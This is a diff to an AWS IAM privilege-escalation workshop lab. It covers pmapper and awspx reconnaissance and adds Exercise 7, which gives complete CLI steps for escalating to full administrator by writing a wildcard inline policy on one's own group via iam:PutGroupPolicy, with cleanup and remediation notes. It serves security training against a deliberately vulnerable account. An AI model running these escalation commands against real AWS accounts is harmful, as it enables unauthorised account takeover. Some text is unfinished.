@@ -4,70 +4,87 @@
 
 ## Overview
 
-In this lab, you'll use industry-standard tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.
+In this lab, you'll use open source tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.
 
 **What You'll Learn:**
+- IAM privilege escalation strategies and what makes them possible
 - How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
 - How to visualize IAM relationships using **awspx**
-- The five categories of IAM privilege escalation (from pathfinding.cloud)
-- How to exploit five distinct privilege escalation paths—each with a **different root cause**
-
-**Why This Matters:**
-IAM misconfigurations are the #1 cause of cloud breaches. A single overly-permissive policy can allow an attacker to escalate from a low-privilege user to full account administrator. By understanding how attackers find and exploit these vulnerabilities, you'll be better equipped to prevent them.
+- How to exploit six distinct privilege escalation paths—each with a **different root cause**
 
 ---
 
-## Prerequisites
+## Environment Set Up
 
-Complete [Lab 0 - Prerequisites](../lab-0-prerequisites/lab-0-prerequisites.md) before starting. If you're at Wild West Hackin' Fest, your environment is pre-configured.
-
-Verify your setup:
-```bash
-aws sts get-caller-identity
-```
-
-You should see your account ID and IAM principal.
-
+TODO - add instructions for allocating AWS account, configuring credentials in web shell, cloning git repo, and running set up script.
 ---
 
-## The Five Privilege Escalation Categories
+## Privilege Escalation Categories
 
-Before we dive in, understand that ALL IAM privilege escalation falls into five categories (from [pathfinding.cloud](https://pathfinding.cloud)):
+Throughout this workshop, we will reference [pathfinding.cloud](https://pathfinding.cloud), an open source knowledge store dedicated to understanding, detecting & demonstrating AWS IAM Privilege Escalation. We'll start by exploring the Privilege Escalation Library and understanding the categories used to 
 
-| Category | Description | What Gets Compromised |
-|----------|-------------|-----------------------|
-| **Self-Escalation** | Modify your own permissions | Your own principal |
-| **Principal Access** | Access another principal's credentials or trust | Another user or role |
-| **New PassRole** | Pass a role to NEW compute (EC2, Lambda, etc.) | Compute resource credentials |
-| **Existing PassRole** | Modify EXISTING compute that has a role | Existing Lambda, EC2, etc. |
-| **Credential Access** | Access credentials stored insecurely | Secrets, keys, passwords |
+1. Navigate to [pathfinding.cloud](https://pathfinding.cloud) in your browser.
 
-In this lab, you'll exploit **one vulnerability from each category**—with five different root causes requiring five different defenses.
+1. Open the **Privilege Escalation Library**.
+
+1. Note the drop-down menu to filter by **CATEGORY**. As of writing these instructions, pathfinding.cloud organizes privilege escalation paths into five categories.
+
+| Category              | Description                                 |
+|-----------------------|---------------------------------------------|
+| **Self-Escalation**   | Modify your own permissions directly to escalate privileges
+| **Principal Access**  | Gain access to a different principal to escalate privileges       |
+| **New PassRole**      | Create a new resource (EC2, Lambda, etc.) and pass a privileged role to it |
+| **Existing PassRole** | Modify an existing resource with an attached role and gain access to that role     |
+| **Credential Access** | Access to hardcoded credentials stored insecurely        |
+
+In this lab, you'll exploit vulnerabilities from several of these categories.
+
+Take a moment to explore the different categories in pathfinding.cloud. You can click on each path to see a description and attack visualization. 
 
 ---
 
 ## Exercise 1: Building Your IAM Intelligence
 
-Before you can find vulnerabilities, you need visibility. In this exercise, you'll use two complementary tools:
+Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will approach this the same way many bad actors do, with open source cloud pentesting tools. You will use the following two tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.
 
 - **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
 - **awspx**: Visualizes IAM relationships as an interactive graph
 
+> [!NOTE]
+> In addition to the tools you will use in this lab, there are several well known AWS pentesting tools useful for IAM privilege escalation. The **OSS DETECTION** field on pathfinding.cloud shows you which existing open source tools can detect a given attack path.
+
 ### Understanding the Tools
 
-| Tool | Purpose | Output |
-|------|---------|--------|
-| pmapper | Automated privilege escalation analysis | Text-based findings and queries |
-| awspx | Visual IAM relationship mapping | Interactive graph in browser |
+| Tool | Purpose | 
+|------|---------|
+| pmapper | Script and library for identifying risks in the configuration of AWS Identity and Access Management (IAM) |
+| awspx | Graph-based tool for visualizing effective access and resource relationships within AWS |
 
 ### Part A: Create the pmapper Graph
 
 pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.
 
+> [!NOTE]
+> **What permissions does pmapper need?** pmapper makes read-only AWS API calls to build its graph — `iam:List*` and `iam:Get*` actions across users, roles, groups, and policies. It also calls `sts:GetCallerIdentity` and checks for Organizations SCPs. The AWS managed policy **ReadOnlyAccess** is sufficient. pmapper never modifies your account — it only reads configuration data to build a local graph model.
+>
+> While Pmapper is primarily 
+
 1. **Create the IAM graph:**
    ```bash
-   pmapper graph create
+   pmapper graph create --include-regions us-east-1 us-east-2 us-west-1 us-west-2
    ```
+
+   Example output (partial):
+
+   ```
+    2026-02-06 18:45:12-0700 | Sorting users, roles, groups, policies, and their relationships.
+    2026-02-06 18:45:12-0700 | Obtaining Access Keys data for IAM users
+    2026-02-06 18:45:13-0700 | Gathering MFA virtual device information
+    2026-02-06 18:45:13-0700 | Gathering MFA physical device information
+    2026-02-06 18:45:13-0700 | Determining which principals have administrative privileges
+    2026-02-06 18:45:13-0700 | Initiating edge checks.
+    2026-02-06 18:45:13-0700 | Generating Edges based on EC2 Auto Scaling.
+    ```
 
    This command:
    - Enumerates all IAM users, roles, and groups
@@ -75,21 +92,25 @@ pmapper works by first building a "graph" of your AWS account's IAM configuratio
    - Analyzes trust relationships between principals
    - Takes 1-2 minutes to complete
 
-2. **View the graph summary:**
-   ```bash
-   pmapper graph display
-   ```
+   `pmapper graph create` saves a serialized graph data store to a platform-specific directory such as `~/.local/share/principalmapper` on Linux
+   
+   When it finishes running you will see a summary similar to the following:
 
-   You should see output like:
-   ```
-   Graph Data for Account:  115753408004
-     # of Nodes:              42 (9 admins)
-     # of Edges:              38
-     # of Groups:             0
-     # of (tracked) Policies: 48
-   ```
+    ```
+    Graph Data for Account:  <account ID>
+    # of Nodes:              45 (11 admins)
+    # of Edges:              38
+    # of Groups:             2
+    # of (tracked) Policies: 52
+    ```
 
-   The "9 admins" tells you how many principals have administrative access—these are high-value targets for attackers.
+    You can redisplay this graph summary any time with 
+
+    ```
+    pmapper graph display
+    ```
+
+   In the example above `11 admins` tells you how many principals have administrative access—these are high-value targets for attackers.
 
 ### Part B: Run Privilege Escalation Analysis
 
@@ -99,7 +120,7 @@ Now use pmapper to automatically find privilege escalation paths:
 pmapper analysis --output-type text
 ```
 
-**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore:
+**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore. The following are a few examples of what you will see in the pmapper output.
 
 ```
 * user/iamws-ci-runner-user can escalate privileges by accessing the
@@ -122,21 +143,61 @@ pmapper analysis --output-type text
 
 ### Part C: Load Data into awspx
 
-awspx provides a visual way to explore IAM relationships. It's already running at [http://localhost](http://localhost).
+awspx provides a visual way to explore IAM relationships. Where pmapper gives you text-based output, awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost](http://localhost).
 
 1. **Ingest AWS IAM data:**
    ```bash
-   docker exec awspx python3 /opt/awspx/cli.py ingest \
-     --env --services IAM --region us-east-1
+   awspx ingest --env --services IAM --region us-east-1
    ```
 
-   This pulls the same IAM data into awspx's graph database.
+   Similar to pmapper, this command pulls IAM data into awspx's graph database (Neo4j).
 
 2. **Open awspx** in your browser at [http://localhost](http://localhost)
 
-3. **Search for workshop users:** Type `iamws` in the search box to see the workshop IAM principals
+   You'll see an empty canvas with a **search bar** at the bottom and a **toolbar** on the right side.
 
-You now have two powerful tools ready to explore IAM vulnerabilities.
+3. **Add a resource to the graph:** Click the search bar and type `iamws-group-admin-user`. Select it from the dropdown. A single **user node** (red person icon) appears on the canvas.
+
+   > [!TIP]
+   > The search bar acts as a resource picker. Type any part of a resource name and awspx shows matching users, roles, groups, and policies from the ingested data. Selecting a resource adds it as a node on the graph.
+
+4. **Find the attack path using Advanced Search:**
+
+   Now let's ask awspx: *"Can this user reach admin?"*
+
+   a. Click the **filter icon** (⚙) to the right of the search bar to open **Advanced Search**.
+
+   b. In the **From** field, type `iamws-group-admin-user` and select it from the dropdown.
+
+   c. In the **To** field, type `Effective Admin` and select it. "Effective Admin" is a special awspx node that represents full administrative access (`Action: *, Resource: *`).
+
+   d. Notice the generated query at the bottom of the panel:
+      ```
+      MATCH Paths=ShortestPath((Source)-[:TRANSITIVE|ATTACK*0..]->(Target))
+      WHERE ID(Source) IN [...]
+      AND ID(Target) IN [...]
+      RETURN Paths LIMIT 500
+      ```
+      This is a [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) query that finds the shortest path between the two resources, following transitive permissions and attack edges.
+
+   e. Click the **Run** button (▶) in the bottom-right corner.
+
+5. **Interpret the result:**
+
+   The graph now shows two nodes connected by a **dashed arrow**:
+
+   - **`iamws-group-admin-user`** (red person icon) — the attacker
+   - **`Effective Admin`** (crown icon) — full admin access
+   - A **dashed line labeled `PutGroupPolicy`** connecting them — the attack path
+
+   **What this tells you:** awspx discovered that `iamws-group-admin-user` can reach administrative access through the `PutGroupPolicy` action. The dashed line represents an *attack edge*—meaning this isn't a direct permission, but an exploitable path that an attacker could follow to escalate privileges.
+
+   > [!NOTE]
+   > You'll exploit this exact path later in Exercise 7. For now, the key takeaway is that awspx can visually map out privilege escalation paths that would be difficult to spot by reading JSON policies alone.
+
+6. **Explore on your own:** Click the **back arrow** (←) at the bottom-left to return to the search bar. Try running the same Advanced Search for other `iamws-` users (like `iamws-ci-runner-user` or `iamws-role-assumer-user`) to see their paths to `Effective Admin`. Each user reaches admin through a *different* attack path—this is the variety of vulnerabilities you'll exploit in the upcoming exercises.
+
+You now have two powerful tools ready to explore IAM vulnerabilities. pmapper gives you scriptable text output for querying specific permissions, while awspx gives you a visual graph for discovering and understanding attack paths.
 
 ---
 
@@ -524,6 +585,10 @@ Expected output:
   the administrative principal role/iamws-privileged-lambda-role:
    * user/iamws-lambda-developer-user can use Lambda to edit an existing
      function (arn:aws:lambda:...:function:iamws-privileged-lambda)
+
+* user/iamws-group-admin-user can escalate privileges by using
+  iam:PutGroupPolicy to add an administrative inline policy to a
+  group they belong to
 ```
 
 ### Part B: Understand the Attack Category
@@ -694,6 +759,134 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
 ---
 
+## Exercise 7: PutGroupPolicy - Self-Escalation via Groups
+
+**Category:** Self-Escalation
+**Attacker:** `iamws-group-admin-user`
+
+**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.
+
+**Real-world scenario:** A team lead is given permission to manage group policies for their team. Without a resource constraint limiting WHICH groups they can modify, they can escalate by writing an admin inline policy on their own group.
+
+### Part A: Identify with pmapper
+
+```bash
+pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
+```
+
+Expected output:
+```
+user/iamws-group-admin-user IS authorized to call action
+iam:PutGroupPolicy for resource *
+```
+
+**What this means:** The user can write inline policies on ANY group—including groups they belong to. Since inline policies on a group apply to all members, this is a direct self-escalation path.
+
+### Part B: Understand the Attack Category
+
+Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to understand this attack path:
+
+- **Category:** Self-Escalation
+- **Required Permission:** `iam:PutGroupPolicy` (unrestricted)
+- **Attack:** Write an inline policy with admin permissions on a group the attacker belongs to
+- **Impact:** Immediate full account access for the attacker (and all other group members)
+
+This is different from Exercise 2's self-escalation (CreatePolicyVersion)—here the attacker escalates through a **group** rather than modifying a managed policy directly. Inline policies on groups are often overlooked in security reviews.
+
+### Part C: Exploit the Vulnerability
+
+**Step 1: Get credentials for the vulnerable principal**
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+
+CREDS=$(aws sts assume-role \
+  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-group-admin-role \
+  --role-session-name attacker \
+  --query "Credentials" \
+  --output json)
+
+export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
+```
+
+**Step 2: Verify your attacker identity**
+```bash
+aws sts get-caller-identity
+```
+
+You should see you're now operating as `iamws-group-admin-role`.
+
+**Step 3: Enumerate groups and find your membership**
+```bash
+# List all groups
+aws iam list-groups --query 'Groups[].GroupName' --output table
+
+# Check which groups the attacker belongs to
+aws iam list-groups-for-user --user-name iamws-group-admin-user \
+  --query 'Groups[].GroupName' --output table
+```
+
+You'll see the user is a member of `iamws-dev-team`.
+
+**Step 4: View the current benign inline policy**
+```bash
+# List inline policies on the group
+aws iam list-group-policies --group-name iamws-dev-team
+
+# Read the current policy (read-only permissions)
+aws iam get-group-policy \
+  --group-name iamws-dev-team \
+  --policy-name iamws-dev-team-readonly \
+  --query 'PolicyDocument' --output json
+```
+
+Note the limited permissions (S3/EC2 read-only).
+
+**Step 5: Write an admin inline policy on the group**
+```bash
+aws iam put-group-policy \
+  --group-name iamws-dev-team \
+  --policy-name iamws-dev-team-escalated \
+  --policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Action": "*",
+      "Resource": "*"
+    }]
+  }'
+```
+
+**Step 6: Verify the escalation**
+```bash
+# Now test an admin action - list all IAM users
+aws iam list-users --query 'Users[].UserName' --output table
+```
+
+**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. Every member of `iamws-dev-team` is now also an admin.
+
+### Cleanup
+
+```bash
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+
+# Verify you're back to your original identity
+aws sts get-caller-identity
+```
+
+**Instructor will remove the escalated inline policy.**
+
+### What You Learned
+
+- **iam:PutGroupPolicy** with `Resource: "*"` allows writing inline policies on any group
+- Inline policies on a group immediately apply to **all group members**
+- The root cause is the wildcard resource—the user should only be able to manage specific groups
+- This is a second form of self-escalation: through **group membership** rather than direct policy modification
+- **Remediation preview:** In Lab 2, you'll restrict `PutGroupPolicy` with a **resource constraint** limiting which group ARNs can be modified
+
+---
+
 ## Wrap-up
 
 ### What You Accomplished
@@ -701,7 +894,7 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 In this lab, you:
 1. Built an IAM graph using pmapper and identified privilege escalation paths
 2. Explored IAM relationships visually with awspx
-3. Exploited **five distinct privilege escalation vulnerabilities**, each with a **different root cause**:
+3. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:
 
 | Exercise | Attack | Category | Root Cause |
 |----------|--------|----------|------------|
@@ -710,6 +903,7 @@ In this lab, you:
 | 4 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
 | 5 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
 | 6 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars |
+| 7 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |
 
 ### Why Different Root Causes Matter
 
@@ -725,6 +919,7 @@ But each vulnerability requires a **different defense**:
 | PassRole missing condition | **Condition Key** (`iam:PassedToService`) |
 | Can modify any resource | **Resource Constraint** |
 | Secrets in plaintext | **Use Secrets Manager** |
+| PutGroupPolicy on any group | **Resource Constraint** (restrict to specific group ARNs) |
 
 ### Mapping to Lab 2 Remediations
 
@@ -735,6 +930,7 @@ But each vulnerability requires a **different defense**:
 | PassRole + EC2 | Add Condition Key | Condition Key |
 | UpdateFunctionCode | Resource Constraint | Identity Policy Fix |
 | GetFunctionConfiguration | Use Secrets Manager | Best Practice |
+| PutGroupPolicy | Restrict Resource ARN | Resource Constraint |
 
 ---
 
